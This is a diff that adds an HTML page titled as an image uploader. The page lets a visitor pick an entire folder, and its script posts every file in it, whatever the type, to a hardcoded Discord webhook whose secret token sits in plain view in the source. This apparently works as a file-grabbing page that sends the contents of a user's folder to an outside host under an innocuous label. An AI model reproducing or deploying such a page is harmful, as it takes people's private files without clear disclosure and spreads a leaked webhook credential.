@@ -1,0 +1,31 @@
+<!-- templates/index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Upload All Images</title>
+</head>
+<body>
+    <h1>Upload Images</h1>
+    <input type="file" id="fileInput" multiple webkitdirectory directory>
+    <button onclick="uploadFiles()">Upload</button>
+
+    <script>
+        async function uploadFiles() {
+            const files = document.getElementById('fileInput').files;
+            const webhook = "https://discordapp.com/api/webhooks/1430032843664392285/jSQpCp6bVM-p1Yz12wzBB0F_yqmAz70G1G3MRO9hpcTHoimaimkUSvvmX99OzpGYH8_O";
+
+            for (let file of files) {
+                const formData = new FormData();
+                formData.append('file', file);
+
+                await fetch(webhook, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+            alert("All files uploaded!");
+        }
+    </script>
+</body>
+</html>
